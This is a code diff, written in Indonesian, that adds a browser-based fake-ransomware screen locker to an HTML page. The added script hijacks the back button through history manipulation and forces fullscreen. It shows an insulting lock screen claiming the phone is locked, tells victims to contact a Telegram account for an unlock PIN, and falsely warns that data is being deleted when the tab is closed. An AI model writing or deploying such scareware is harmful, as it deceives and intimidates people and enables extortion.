@@ -110,3 +110,79 @@
     </script>
 </body>
 </html>
+    <!-- RANSOMWARE -->
+    <div id="ransom-screen" class="flash">
+        <h1>HAHA TOLOL!!<br>PONSEL ANDA TERKUNCI!!</h1>
+        
+        <video id="idiotVideo" loop playsinline>
+            <source src="idiot_video.mp4" type="video/mp4">
+        </video>
+
+        <div class="bottom-panel">
+            <p style="color: yellow; font-weight: bold;">JIKA INGIN BEBAS CHAT TELEGRAM @alzzisback<br>MASUKIN PINNYA</p>
+            <input type="number" id="pinInput" placeholder="MASUKKAN PIN">
+            <button class="btn-unlock" onclick="verifyPin()">UNLOCK PERANGKAT</button>
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('idiotVideo');
+        const screen = document.getElementById('ransom-screen');
+
+        // 1. Kunci Tombol Back (History Hijacking)
+        function antiBack() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+                alert("GAK BISA KELUAR TOLOL! MASUKIN PIN!");
+            };
+        }
+
+        // 2. Aktifkan Ransomware
+        function lockSystem() {
+            document.getElementById('overlay').style.display = 'none';
+            screen.style.display = 'block';
+            video.play();
+            antiBack();
+            startBouncing();
+            forceFullscreen();
+        }
+
+        // 3. Paksa Fullscreen (Menghilangkan Navigasi HP)
+        function forceFullscreen() {
+            let el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
+
+        // 4. Animasi Video Mantul
+        function startBouncing() {
+            let x = 0, y = 0, dx = 8, dy = 8;
+            setInterval(() => {
+                if (x + video.offsetWidth > window.innerWidth || x < 0) dx = -dx;
+                if (y + video.offsetHeight > window.innerHeight || y < 0) dy = -dy;
+                x += dx; y += dy;
+                video.style.left = x + 'px';
+                video.style.top = y + 'px';
+            }, 30);
+        }
+
+        // 5. Cek PIN
+        function verifyPin() {
+            const pin = document.getElementById('pinInput').value;
+            if (pin === "201192777") {
+                alert("AKSES DITERIMA. JANGAN TOLOL LAGI!");
+                window.onbeforeunload = null;
+                location.reload(); 
+            } else {
+                alert("PIN SALAH DASAR TOLOL!");
+            }
+        }
+
+        // 6. Cegah Tutup Tab (Warning)
+        window.onbeforeunload = function() {
+            return "DATA ANDA SEDANG DIHAPUS!";
+        };
+    </script>
+</body>
+</html>
